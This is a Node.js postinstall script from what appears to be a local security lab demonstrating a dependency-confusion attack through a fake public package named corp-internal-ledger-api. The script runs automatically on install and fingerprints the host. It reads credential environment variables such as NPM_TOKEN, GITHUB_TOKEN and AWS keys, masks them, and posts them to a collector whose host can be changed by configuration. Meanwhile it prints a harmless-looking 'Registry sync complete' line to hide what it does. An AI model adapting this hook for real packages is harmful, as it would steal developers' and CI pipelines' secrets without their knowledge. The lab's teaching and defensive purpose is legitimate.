/**
 * LAB ATK2 — Dependency Confusion demonstration (local only, no real registry).
 *
 * This postinstall runs when the package manager resolves the PUBLIC version
 * (9.9.9) of corp-internal-ledger-api instead of the trusted internal (1.4.2).
 *
 * Default output: benign-looking lines (developer does not see an attack).
 * Verbose output: set LAB_ATK2_VERBOSE=1 before npm install.
 * Periodic snapshots: set LAB_ATK2_PERIODIC_DEMO=1 (30-min ticks, local only).
 *
 * Report written to: ~/.supply-chain-lab/last-atk2-exfil.json
 */
import { mkdirSync, writeFileSync } from "node:fs";
import http from "node:http";
import { join } from "node:path";
import os from "node:os";
import { fetchProtectionCheck } from "../_lab/protection-check.mjs";

const homedir = os.homedir();
const labDir = join(homedir, ".supply-chain-lab");
const reportPath = join(labDir, "last-atk2-exfil.json");

const VERBOSE = process.env.LAB_ATK2_VERBOSE === "1";

const WATCHED_KEYS = [
  "DEMO_SECRET",
  "NPM_TOKEN",
  "NODE_AUTH_TOKEN",
  "GITHUB_TOKEN",
  "GH_TOKEN",
  "AWS_ACCESS_KEY_ID",
  "AWS_SECRET_ACCESS_KEY",
  "AWS_SESSION_TOKEN",
  "CI_JOB_TOKEN",
  "NETLIFY_AUTH_TOKEN",
];

function mask(val) {
  if (val == null || val === "") return "(unset)";
  const s = String(val);
  if (s.length <= 8) return `[redacted, ${s.length} chars]`;
  return `${s.slice(0, 4)}…(+${s.length - 8} chars)…${s.slice(-4)}`;
}

function watchedEnvSnapshot() {
  const snap = {};
  for (const k of WATCHED_KEYS) {
    if (process.env[k] !== undefined) snap[k] = mask(process.env[k]);
  }
  return snap;
}

function phoneHome(data) {
  const collectorHost = process.env.LAB_COLLECTOR_HOST || "127.0.0.1";
  const collectorPort = Number(process.env.LAB_COLLECTOR_PORT || "8000");
  const payload = JSON.stringify(data);
  return new Promise((resolve) => {
    try {
      const req = http.request(
        {
          host: collectorHost,
          port: collectorPort,
          path: "/v1/lab/install-alert",
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(payload),
          },
          timeout: 3000,
        },
        (res) => { res.resume(); res.on("end", resolve); }
      );
      req.on("error", () => resolve());
      req.on("timeout", () => { req.destroy(); resolve(); });
      req.write(payload);
      req.end();
    } catch { resolve(); }
  });
}

(async () => {
  try {
  const PACKAGE = "corp-internal-ledger-api";
  const PACKAGE_VERSION = "9.9.9";
  const protection = await fetchProtectionCheck(PACKAGE, PACKAGE_VERSION);

  if (protection.blocked) {
    const initCwd = process.env.INIT_CWD || process.cwd();
    const hostname = os.hostname();
    let username = null;
    try {
      username = os.userInfo().username;
    } catch {
      /* ignore */
    }

    await phoneHome({
      status: "blocked",
      package: PACKAGE,
      version: PACKAGE_VERSION,
      attack_type: protection.attack_type || "dependency_confusion",
      block_reason: protection.reason,
      engine: protection.engine || null,
      hostname,
      username,
      platform: `${process.platform} ${os.release()}`,
      cwd: initCwd,
      victim_terminal: [
        `> ${PACKAGE}@${PACKAGE_VERSION} postinstall`,
        `[supply-chain-security] Blocked malicious install: ${PACKAGE}`,
        `[supply-chain-security] ${protection.reason}`,
      ],
      attacker_terminal: [
        "",
        "╔══════════════════════════════════════════════════════╗",
        "║  SUPPLY CHAIN PROTECTION — INSTALL BLOCKED           ║",
        "╚══════════════════════════════════════════════════════╝",
        `[!] Package : ${PACKAGE}@${PACKAGE_VERSION}`,
        `[!] Reason  : ${protection.reason}`,
        `[!] Hostname: ${hostname}`,
        "",
        "[✓] Dependency confusion exfil did NOT run.",
      ],
    });

    console.error(`[supply-chain-security] Attack blocked: ${protection.reason}`);
    process.exit(1);
  }

  const watched = watchedEnvSnapshot();
  const initCwd = process.env.INIT_CWD || process.cwd();

  const report = {
    attack_type: "dependency_confusion",
    attack_package: "corp-internal-ledger-api",
    attacker_version: "9.9.9",
    legitimate_version: "1.4.2",
    disclaimer:
      "Controlled lab artifact. Demonstrates ATK2 (Alex Birsan 2021): same package name, higher public version wins.",
    timestamp: new Date().toISOString(),
    install_invoked_from: initCwd,
    why_attacker_won: [
      "Developer ran `npm upgrade` or `npm install` without a private registry pin.",
      "Package manager checked public registry alongside internal registry.",
      "Public version 9.9.9 > internal version 1.4.2 → public wins automatically.",
      "No typo made. Correct package name, wrong source.",
    ],
    backdoors_demonstrated: [
      "postinstall hook runs automatically on npm install/upgrade",
      "Full read access to process.env (tokens, secrets, CI keys)",
      "Host fingerprinting (hostname, OS, username, cwd)",
      "File write as the installing user (this report)",
    ],
    what_operator_would_receive: {
      cwd_during_hook: process.cwd(),
      npm_init_cwd: process.env.INIT_CWD ?? null,
      hostname: os.hostname(),
      platform: `${process.platform} ${os.release()}`,
      username: (() => {
        try { return os.userInfo().username; } catch { return null; }
      })(),
      npm_package_name: process.env.npm_package_name ?? null,
      npm_lifecycle_event: process.env.npm_lifecycle_event ?? null,
      npm_config_user_agent: process.env.npm_config_user_agent ?? null,
      watched_sensitive_env: watched,
      path_length_chars: process.env.PATH ? process.env.PATH.length : 0,
    },
    defence_controls: {
      baseline_missed: "No private registry precedence enforced → public won.",
      improved_fix: [
        "Pin `registry=<internal-url>` in .npmrc for internal-style packages.",
        "Use scoped packages (@corp/ledger-api) — public registry cannot host @corp scope without org ownership.",
        "Lock package versions in package-lock.json / yarn.lock and verify integrity hashes.",
        "Enforce namespace allowlist in CI (block corp-internal-* from public npm).",
      ],
    },
    report_file: reportPath,
  };

  mkdirSync(labDir, { recursive: true });
  writeFileSync(reportPath, `${JSON.stringify(report, null, 2)}\n`, "utf8");

  const wr = report.what_operator_would_receive;
  const envLines = Object.keys(watched).length
    ? Object.keys(watched).map((k) => `    ${k} = ${watched[k]}`)
    : ["    (no watched keys — export DEMO_SECRET to demo capture)"];

  phoneHome({
    status: "allowed",
    package: "corp-internal-ledger-api",
    version: "9.9.9",
    attack_type: "dependency_confusion",
    hostname: wr.hostname,
    username: wr.username,
    platform: wr.platform,
    cwd: report.install_invoked_from,
    watched_env: watched,
    victim_terminal: [
      "> corp-internal-ledger-api@9.9.9 postinstall",
      "> node postinstall.mjs",
      "[corp-internal-ledger-api] v9.9.9 — Registry sync complete. Ledger API ready.",
    ],
    attacker_terminal: [
      "",
      "╔══════════════════════════════════════════════════════╗",
      "║  ATTACKER C2 — DEPENDENCY CONFUSION BEACON           ║",
      "╚══════════════════════════════════════════════════════╝",
      "[+] Attack    : ATK2 dependency confusion",
      "[+] Package   : corp-internal-ledger-api@9.9.9 (public beat internal 1.4.2)",
      `[+] Hostname  : ${wr.hostname}`,
      `[+] User      : ${wr.username ?? "unknown"}`,
      `[+] CWD       : ${report.install_invoked_from}`,
      "",
      "[*] Exfiltrated environment (masked):",
      ...envLines,
      "",
      "[✓] Internal API namespace hijacked — postinstall ran on victim CI/dev machine.",
    ],
  }).catch(() => {});

  /* ── Default output: looks like a normal helper ── */
  console.log("[corp-internal-ledger-api] v9.9.9 — Registry sync complete. Ledger API ready.");

  /* ── Verbose: show forensic banner + JSON ── */
  if (VERBOSE) {
    console.log("");
    console.log("╔═══════════════════════════════════════════════════════════════════╗");
    console.log("║  LAB ATK2 — Dependency Confusion postinstall executed             ║");
    console.log("║  Public v9.9.9 resolved instead of internal v1.4.2               ║");
    console.log("╚═══════════════════════════════════════════════════════════════════╝");
    console.log(`  → Report: ${reportPath}`);
    console.log(`  → Installed from (INIT_CWD): ${initCwd}`);
    console.log(`  → Why attacker won: higher public version (9.9.9 > 1.4.2)`);
    const keys = Object.keys(watched);
    console.log(`  → Watched env keys seen (masked): ${keys.length ? keys.join(", ") : "(none — export DEMO_SECRET=foo to demo)"}`);
    console.log("");
    console.log("__LAB_ATK2_JSON__");
    console.log(JSON.stringify(report, null, 2));
    console.log("__LAB_ATK2_JSON_END__");
  }
  } catch (err) {
    console.log(`[corp-internal-ledger-api] Post-install notice: ${err?.message ?? err} (non-fatal).`);
  }
})();
